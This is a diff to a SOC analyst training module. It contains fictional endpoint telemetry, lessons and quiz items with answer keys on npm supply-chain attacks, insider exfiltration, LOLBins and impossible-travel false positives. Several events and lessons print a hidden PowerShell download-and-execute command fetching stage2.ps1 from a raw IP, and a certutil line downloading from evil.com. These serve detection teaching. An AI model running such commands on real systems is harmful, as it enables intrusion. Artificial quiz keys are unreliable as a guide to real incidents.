@@ -10,22 +10,22 @@ const supplyChainEvent: TelemetryEvent = {
   severity: "high",
   hostname: "LT-DEV-0212",
   user_email: "d.wong@nexacorp.com",
-  description: "node.exe spawned a reverse-shell connection from a package postinstall script during npm install",
+  description: "A node.exe process started during npm install on LT-DEV-0212",
   mitre_technique: "T1195.001",
   mitre_tactic: "Initial Access",
   process: {
     name: "node.exe",
     pid: 8821,
-    parent_name: "npm.cmd",
+    parent_name: "node.exe",
     parent_pid: 6610,
     cmdline:
-      "node -e \"require('child_process').exec('powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\\\"http://185.220.101.47/stage2.ps1\\\")')\"",
+      "node -e \"require('child_process').exec('powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\\\"http://203.0.113.47/stage2.ps1\\\")')\"",
     user: "NEXACORP\\d.wong",
     integrity: "medium",
   },
   network: {
-    domain: "185.220.101.47",
-    url: "http://185.220.101.47/stage2.ps1",
+    domain: "203.0.113.47",
+    url: "http://203.0.113.47/stage2.ps1",
   },
   raw: {
     "crowdstrike.event_simpleName": "ProcessRollup2",
@@ -40,10 +40,10 @@ const supplyChainEvent: TelemetryEvent = {
     "crowdstrike.ProcessId": "8821",
     "crowdstrike.ImageFileName": "C:\\Program Files\\nodejs\\node.exe",
     "crowdstrike.CommandLine":
-      "node -e \"require('child_process').exec('powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\\\"http://185.220.101.47/stage2.ps1\\\")')\"",
-    "crowdstrike.ParentImageFileName": "npm.cmd",
+      "node -e \"require('child_process').exec('powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\\\"http://203.0.113.47/stage2.ps1\\\")')\"",
+    "crowdstrike.ParentImageFileName": "C:\\Program Files\\nodejs\\node.exe",
     "crowdstrike.ParentProcessId": "6610",
-    "crowdstrike.ParentCommandLine": "npm install internal-logging-utils",
+    "crowdstrike.ParentCommandLine": "node.exe \"C:\\Program Files\\nodejs\\node_modules\\npm\\bin\\npm-cli.js\" install internal-logging-utils",
     "crowdstrike.UserName": "NEXACORP\\d.wong",
     "crowdstrike.ComputerName": "LT-DEV-0212",
     "process.code_signature.exists": true,
@@ -136,7 +136,7 @@ const lowAndSlowEvent: TelemetryEvent = {
   severity: "low",
   hostname: "LT-FIN-1187",
   user_email: "m.reyes@nexacorp.com",
-  description: "User downloaded 14 files from the Contracts SharePoint library, the seventeenth consecutive day of small downloads from the same library",
+  description: "User downloaded 14 files from the Contracts SharePoint library",
   raw: {
     "data.office365.Operation": "FileDownloaded",
     "data.office365.Workload": "SharePoint",
@@ -221,7 +221,7 @@ const lolbinEvent: TelemetryEvent = {
   raw: {
     "mde.ActionType": "ProcessCreated",
     "mde.DetectionSource": "EDR",
-    "mde.SHA256": "b4a1c9d7e2f56830a1bb44c02f7de9915ee2c4a7f0c8b13d5e9a2f6c7b8d901",
+    "mde.SHA256": "b4a1c9d7e2f56830a1bb44c02f7de9915ee2c4a7f0c8b13d5e9a2f6c7b8d9014",
     "process.name": "regsvr32.exe",
     "process.pid": "4420",
     "process.command_line": "regsvr32.exe /s C:\\AppDeploy\\ReportEngine\\ReportViewerCtl.dll",
@@ -298,19 +298,19 @@ const edgeCaseRoom = {
       content:
         "Most detection programs are built around a simple mental model: an attacker sends a malicious file or link, a user opens it, malware runs. Supply-chain attacks break that model completely, because the malicious code arrives through a channel everyone implicitly trusts: the build process itself. A developer runs 'npm install' or 'pip install' dozens of times a day. It is routine, expected, and almost never questioned by a SOC analyst watching an alert queue.\n\n" +
         "Dependency confusion is one of the cleanest versions of this attack. Large companies often have internal, private packages named things like 'nexacorp-logging-utils' that are never published to the public npm or PyPI registry. They only exist on an internal package server. An attacker researches the company (through job postings, GitHub repos, leaked internal documentation) and publishes a PUBLIC package with the exact same name, but a higher version number, to the public registry. Because many build tools default to checking the public registry first, or fail over to it when the internal server is briefly unreachable, the higher-versioned public package can silently win the dependency resolution and get installed instead of the real one.\n\n" +
-        "The other common variant is typosquatting: 'reqeusts' instead of 'requests', 'crossenv' instead of 'cross-env'. A tired developer typing quickly, or a copy-pasted install command from a tutorial with a typo, is enough. Once the malicious package is selected, the payload usually does not run as a separate suspicious executable. It runs inside an npm 'postinstall' script or a Python 'setup.py' during install, which is a completely normal and expected part of package installation. That script can spawn a shell, phone home, or drop a stager, all under the identity and process lineage of npm.cmd or pip.exe, tools your EDR almost certainly has an exclusion or a low baseline suspicion score for.\n\n" +
-        "Why analysts miss it: the alert (if one fires at all) shows a child process of npm.cmd or python.exe, which analysts are trained to associate with normal developer workflow noise. The parent-child relationship looks legitimate because, mechanically, it is legitimate: npm really did spawn node.exe, which really did execute a script. The malicious intent is buried inside the command line arguments and the destination of the outbound connection, not in the process tree shape.\n\n" +
+        "The other common variant is typosquatting: 'reqeusts' instead of 'requests', 'crossenv' instead of 'cross-env'. A tired developer typing quickly, or a copy-pasted install command from a tutorial with a typo, is enough. Once the malicious package is selected, the payload usually does not run as a separate suspicious executable. It runs inside an npm 'postinstall' script or a Python 'setup.py' during install, which is a completely normal and expected part of package installation. That script can spawn a shell, phone home, or drop a stager, all under the identity and process lineage of npm or pip.exe, tools your EDR almost certainly has an exclusion or a low baseline suspicion score for.\n\n" +
+        "Why analysts miss it: the alert (if one fires at all) shows a child process of npm (node.exe on Windows, because npm.cmd is only a batch launcher for it) or python.exe, which analysts are trained to associate with normal developer workflow noise. The parent-child relationship looks legitimate because, mechanically, it is legitimate: npm really did spawn node.exe, which really did execute a script. The malicious intent is buried inside the command line arguments and the destination of the outbound connection, not in the process tree shape.\n\n" +
         "The detection tell: look at what the spawned process is actually doing, not what spawned it. A postinstall script that opens a network connection to an IP address (not a domain), especially over plain HTTP, and especially followed by a PowerShell download-and-execute pattern, is the signal, regardless of how innocent the parent process looks. Cross-reference the package name and version against your internal artifact registry: if the version installed does not match what your internal registry serves, or the package was pulled from the public registry when an internal equivalent exists, that mismatch alone is worth an alert.",
       codeExample:
         "SUSPICIOUS PROCESS TREE (looks routine at first glance)\n" +
         "==========================================================\n" +
         "cmd.exe\n" +
-        "  \\_ npm.cmd  (cmdline: npm install internal-logging-utils)\n" +
+        "  \\_ node.exe  (npm itself, cmdline: npm-cli.js install internal-logging-utils)\n" +
         "       \\_ node.exe  (cmdline: node -e \"require('child_process').exec(\n" +
         "            'powershell -nop -w hidden -c IEX(New-Object Net.WebClient)\n" +
-        "             .DownloadString(\\\"http://185.220.101.47/stage2.ps1\\\")')\")\n\n" +
+        "             .DownloadString(\\\"http://203.0.113.47/stage2.ps1\\\")')\")\n\n" +
         "WHY IT PASSES CASUAL REVIEW:\n" +
-        "  - npm.cmd spawning node.exe is 100% normal: happens constantly\n" +
+        "  - npm's node.exe spawning another node.exe is 100% normal: happens constantly\n" +
         "  - No suspicious file dropped to disk yet\n" +
         "  - No AV signature match (payload is fileless, delivered inline)\n\n" +
         "THE TELL:\n" +
@@ -346,7 +346,7 @@ const edgeCaseRoom = {
       ],
       answer: 1,
       explanation:
-        "EDR baselines are heavily shaped by parent-child process legitimacy. npm.cmd spawning node.exe (or pip spawning python.exe) is extremely common developer activity, so the process tree alone carries a low suspicion score. The actual malicious signal is buried in what the spawned process does (an inline eval executing a download-and-run chain to a raw IP address) which requires inspecting command-line arguments and network destinations, not just the process ancestry.",
+        "EDR baselines are heavily shaped by parent-child process legitimacy. npm spawning node.exe (or pip spawning python.exe) is extremely common developer activity, so the process tree alone carries a low suspicion score. The actual malicious signal is buried in what the spawned process does (an inline eval executing a download-and-run chain to a raw IP address) which requires inspecting command-line arguments and network destinations, not just the process ancestry.",
       xp: 20,
     },
 
@@ -356,21 +356,21 @@ const edgeCaseRoom = {
       id: "edge-la1",
       heading: "CrowdStrike Falcon: A Postinstall Script That Isn't What It Claims to Be",
       context:
-        "A developer, d.wong, ran 'npm install internal-logging-utils' on their laptop while pulling in a new dependency for an internal tool. CrowdStrike Falcon generated a medium-confidence detection a few seconds later. At first glance this looks like routine developer tooling noise: npm spawning node.exe happens constantly across your fleet. Look carefully at every field before deciding whether this is routine.",
+        "A developer, d.wong, ran 'npm install internal-logging-utils' on their laptop while pulling in a new dependency for an internal tool. CrowdStrike Falcon raised a High-severity detection a few seconds later. At first glance this looks like routine developer tooling noise: npm spawning node.exe happens constantly across your fleet. Look carefully at every field before deciding whether this is routine.",
       event: supplyChainEvent,
       questions: [
         {
           question:
             "node.exe running under npm during an install is normal. Which detail in this record shows that this particular node.exe run is NOT just the package's ordinary install step?",
           options: [
-            "crowdstrike.FileSigned is true, which means the inline code must have been injected by tampering with node.exe itself",
+            "process.code_signature.trusted is true, which means the inline code must have been injected by tampering with node.exe itself",
             "The command differs from the declared postinstall (node ./scripts/setup.js) and chains exec into hidden PowerShell",
             "PatternDispositionDescription reads “Detection, No Action”, so Falcon has already judged the command to be benign",
-            "The parent is npm.cmd rather than node.exe, which shows npm ran a script outside of its normal install lifecycle",
+            "The parent is node.exe running npm-cli.js, which shows npm ran a script outside of its normal install lifecycle",
           ],
           answer: 1,
           explanation:
-            "The package declares its postinstall as 'node ./scripts/setup.js' (npm.scripts.postinstall), but the process that actually ran is inline code that calls child_process.exec to launch hidden PowerShell and download-and-execute a script from a raw IP. The tell is the chain and the mismatch with what the package declares, not the use of node or of -e as such. “FileSigned is true” only says node.exe is the genuine signed runtime; the malicious logic is in the arguments it was given, not in a modified binary. “Detection, No Action” means Falcon detected and did not block. It is not a benign verdict. “The parent is npm.cmd” is the normal lineage for an install script, which is exactly why this attack blends in.",
+            "The package declares its postinstall as 'node ./scripts/setup.js' (npm.scripts.postinstall), but the process that actually ran is inline code that calls child_process.exec to launch hidden PowerShell and download-and-execute a script from a raw IP. The tell is the chain and the mismatch with what the package declares, not the use of node or of -e as such. “process.code_signature.trusted is true” only says node.exe is the genuine signed runtime; the malicious logic is in the arguments it was given, not in a modified binary. “Detection, No Action” means Falcon detected and did not block. It is not a benign verdict. “The parent is node.exe running npm-cli.js” is the normal lineage for an install script, which is exactly why this attack blends in.",
           xp: 25,
         },
         {
@@ -389,7 +389,7 @@ const edgeCaseRoom = {
         },
         {
           question:
-            "The download URL inside crowdstrike.CommandLine is a raw IP address (185.220.101.47) over plain HTTP, rather than a domain name over HTTPS. Why does this detail raise the priority of the detection?",
+            "The download URL inside crowdstrike.CommandLine is a raw IP address (203.0.113.47) over plain HTTP, rather than a domain name over HTTPS. Why does this detail raise the priority of the detection?",
           options: [
             "Plain HTTP lets anyone on the path tamper with the download, so the main risk is a man-in-the-middle swap",
             "Package hosts serve named domains over HTTPS; a bare IP over HTTP for a second stage is cheap attacker infra",
@@ -413,7 +413,8 @@ const edgeCaseRoom = {
         "DLP (Data Loss Prevention) systems are built around thresholds: block if a user downloads more than 50 files per hour, alert if an email attachment exceeds 25MB, flag if a single USB copy exceeds 500MB. These thresholds exist because security teams need a bright line to avoid drowning in noise, and attackers who understand this simply stay under the line.\n\n" +
         "A malicious insider planning to leave a company with a competitor's contract book does not need speed. They have weeks or months. Instead of one large download that trips a bulk-export alert, they download twelve to fifteen files a day from the same SharePoint library, every day, for weeks. Each individual session looks unremarkable: a handful of PDFs, well under any per-hour or per-day threshold your DLP policy enforces. No single event would ever justify escalation on its own.\n\n" +
         "Why analysts miss it: DLP and most SIEM correlation rules are inherently stateless or short-window, they evaluate the last hour, or the last 24 hours, and reset. A user downloading 14 files today generates the same low-severity, informational-grade event as a user downloading 14 files for the first time ever. Nothing in the event itself encodes 'this is the seventeenth consecutive day of elevated activity from a user whose baseline is 2-3 downloads per day.' That context lives only in behavioral baselining (UEBA), which many organizations either do not have, do not tune, or do not route into the same alert queue their L1 analysts triage.\n\n" +
-        "The detection tell: this attack is invisible at the single-event layer and only visible at the trend layer. The signal is a sustained deviation from personal baseline over a rolling multi-week window, not a single crossed threshold. Fields to watch: cumulative file count over 30 days compared to the user's historical average, number of consecutive days with elevated (but individually sub-threshold) activity, and, critically, whether the access pattern is unusual for the user's role (a salesperson pulling from Legal's contract library is a bigger tell than the raw volume ever will be). The fix is not a lower threshold (that just moves the goalpost and increases false positives). It is a UEBA baseline comparison layered on top of the DLP event stream.",
+        "The detection tell: this attack is invisible at the single-event layer and only visible at the trend layer. The signal is a sustained deviation from personal baseline over a rolling multi-week window, not a single crossed threshold. Fields to watch: cumulative file count over 30 days compared to the user's historical average, number of consecutive days with elevated (but individually sub-threshold) activity, and, critically, whether the access pattern is unusual for the user's role (a salesperson pulling from Legal's contract library is a bigger tell than the raw volume ever will be). The fix is not a lower threshold (that just moves the goalpost and increases false positives). It is a UEBA baseline comparison layered on top of the DLP event stream.\n\n" +
+        "Once the trend and the role mismatch line up, do not lock the user out or quietly cut access on your own. Confirm what was taken, look for onward copies to personal email, cloud storage or USB, and pass it to the manager and HR through the insider-threat playbook, because an approved project or role change may still explain it.",
       codeExample:
         "SINGLE DAY VIEW (what the DLP console shows: looks fine)\n" +
         "=============================================================\n" +
@@ -639,6 +640,7 @@ const edgeCaseRoom = {
       content:
         "Three more edge cases round out this room, and each one shares a common thread: the raw telemetry looks identical whether the activity is malicious or completely routine. The only way to tell them apart is context that lives outside the log itself.\n\n" +
         "Living-off-the-land binaries (LOLBins) are legitimate, digitally signed Windows utilities (certutil.exe, regsvr32.exe, mshta.exe, rundll32.exe, bitsadmin.exe) that attackers repurpose to download files, execute code, or bypass application whitelisting, because these binaries are trusted by design and rarely blocked. certutil.exe is meant to manage certificates, but 'certutil -urlcache -f http://evil.com/payload.exe payload.exe' downloads a file just as well as any browser. regsvr32.exe is meant to register COM DLLs, but it can also load a remote script via the 'scrobj.dll' technique (T1218.010, sometimes called 'Squiblydoo'). The critical trap for analysts: administrators use these exact same tools for exactly these purposes, constantly, as part of normal deployment work. A regsvr32 call registering an internal reporting DLL from a change-managed deployment script is indistinguishable, at the process-execution level, from an attacker registering a malicious scriptlet: same binary, same event ID, same general shape of command line. The signal an analyst must chase is not 'was regsvr32 used' (that question alone produces overwhelming noise), but whether the DLL/script being registered is internally signed and version-controlled, whether the timing lines up with an approved change ticket, and whether a network connection follows the registration (legitimate local DLL registration makes no outbound call; the Squiblydoo technique specifically does, because it is fetching a remote scriptlet).\n\n" +
+        "A rule can fire correctly on real activity that turns out to be authorized: that outcome is a benign true positive, closed by citing the approval. A false positive means the rule misjudged what happened, and mixing the two up invites weakening a detection that works. If authorized work starts a few minutes outside its approved window, record that as a process note for the change board, not as evidence of intrusion.\n\n" +
         "Impossible travel is a classic UEBA/identity detection: a user logs in from Chicago, then twelve minutes later from Dublin, and no commercial flight makes that trip in twelve minutes, so the alert fires as a probable compromised account. But this detection has a well-known, extremely common false-positive source: corporate VPN and cloud-proxy egress. Many enterprises route all remote-worker internet traffic through centralized VPN concentrators or SASE/CASB egress points, and those egress points may sit in a completely different country from the employee. An employee physically in Chicago connects to the corporate VPN, and their outbound traffic egresses from a company-owned pool of IPs in Dublin, because that is where the nearest regional VPN gateway or SASE PoP happens to be. The 'impossible' jump from a Chicago-originated first login (maybe an already-cached mobile session) to a Dublin-sourced second login is not two different people in two countries. It is one person whose traffic legitimately changed apparent origin because of infrastructure, not geography. The detection tell that separates a real account-takeover impossible-travel event from a VPN false positive: check the ASN and organization name behind the second IP. If it resolves to a known corporate VPN provider or your own company's registered egress ASN (not a residential ISP, not an unrelated hosting provider), and especially if a 'security_context.is_proxy' or equivalent field is true, this is very likely infrastructure, not intrusion, though it still deserves a quick verify, because attackers do sometimes route through commercial VPN services specifically to blend into this exact blind spot.\n\n" +
         "Business-logic attacks exploit the intended behavior of an application rather than any code vulnerability, which means signature-based and even most anomaly-based network detections never see them, because no single request is malformed or malicious: the abuse is in the pattern of legitimate requests. Password-reset and account-enumeration abuse is the clearest example: a 'forgot password' endpoint that returns a different response time, a different HTTP status code, or a different message ('no account found' vs. 'reset email sent') depending on whether the submitted email address exists in the system, can be automated against a wordlist of thousands of email addresses to enumerate every valid user account in the organization: all through requests that are each, individually, completely well-formed and application-legitimate. No exploit is used; the application is functioning exactly as designed. The detection tell is velocity and pattern at the business-transaction layer rather than the network-request layer: a single source IP submitting hundreds of sequential, distinct email addresses to a password-reset endpoint in a short window, especially when paired with measurable response-time variance between 'user exists' and 'user does not exist' paths, is the signature of enumeration, and it is a signal only visible if you are logging and analyzing the application's own business logic outcomes, not just whether the HTTP request succeeded.",
       codeExample:
@@ -718,11 +720,11 @@ const edgeCaseRoom = {
       id: "edge-ac1",
       heading: "Verdict: Chicago, Then Dublin, Eleven Minutes Apart",
       scenario:
-        "Okta fires an impossible-travel alert for k.oconnell: a successful login from Chicago is followed eleven minutes later by a successful login from Dublin, Ireland, a physically impossible trip in that timeframe. The account has valid MFA on both sessions. Before escalating this as a probable account takeover, review the full event, particularly the network and security-context fields.",
+        "Okta fires an impossible-travel alert for k.oconnell: a successful login from Chicago is followed eleven minutes later by a successful login from Dublin, Ireland, a physically impossible trip in that timeframe. Before escalating this as a probable account takeover, review the full event, particularly the network and security-context fields.",
       event: impossibleTravelFPEvent,
       correct_verdict: "false_positive",
       explanation:
-        "This is a VPN/corporate-egress false positive, not an account takeover. The decisive fields are okta.securityContext.isProxy = true, okta.securityContext.asNumber/asOrg identifying AS64500 'NexaCorp Ltd - Corporate VPN Egress EMEA' (the organization's own registered VPN egress ASN, not a consumer VPN or an unrelated hosting provider), and network.vpn_gateway_pool explicitly naming 'nexacorp-vpn-emea-dublin-01': a company-owned VPN gateway. The user connected to the corporate VPN from Chicago, and the session was routed out through the company's EMEA gateway pool in Dublin. Both logins carry the same valid MFA-backed identity; there is no credential compromise signal anywhere in the event. The correct action is to close this as a false positive (the rule misfired: it assumes an IP's location is where the user physically is, which a corporate VPN egress breaks, so the fix is to teach the rule the company's own egress ranges) but verify the vpn_gateway_pool value against your organization's known-good VPN infrastructure inventory once, since an attacker could theoretically spoof or ride a similar-looking commercial VPN to hide in this exact blind spot.",
+        "This is a VPN/corporate-egress false positive, not an account takeover. The decisive fields are okta.securityContext.isProxy = true, okta.securityContext.asNumber/asOrg identifying AS64500 'NexaCorp Ltd - Corporate VPN Egress EMEA' (the organization's own registered VPN egress ASN, not a consumer VPN or an unrelated hosting provider), and network.vpn_gateway_pool explicitly naming 'nexacorp-vpn-emea-dublin-01': a company-owned VPN gateway. The user connected to the corporate VPN from Chicago, and the session was routed out through the company's EMEA gateway pool in Dublin. There is no credential compromise signal anywhere in the event. The correct action is to close this as a false positive (the rule misfired: it assumes an IP's location is where the user physically is, which a corporate VPN egress breaks, so the fix is to teach the rule the company's own egress ranges) but verify the vpn_gateway_pool value against your organization's known-good VPN infrastructure inventory once, since an attacker could theoretically spoof or ride a similar-looking commercial VPN to hide in this exact blind spot.",
       fp_trap:
         "The alert title says 'impossible travel' and the raw geography genuinely IS impossible for a human traveler. It is tempting to treat the word 'impossible' as inherently high-severity and escalate immediately. But impossible travel detections were built before centralized VPN/SASE egress was common, and they systematically misfire whenever an organization routes remote traffic through geographically distant egress points. Always check is_proxy and the ASN/org name behind the IP before trusting the geography at face value: the raw distance-over-time math is only meaningful if both IPs represent the user's true physical location.",
       xp: 30,
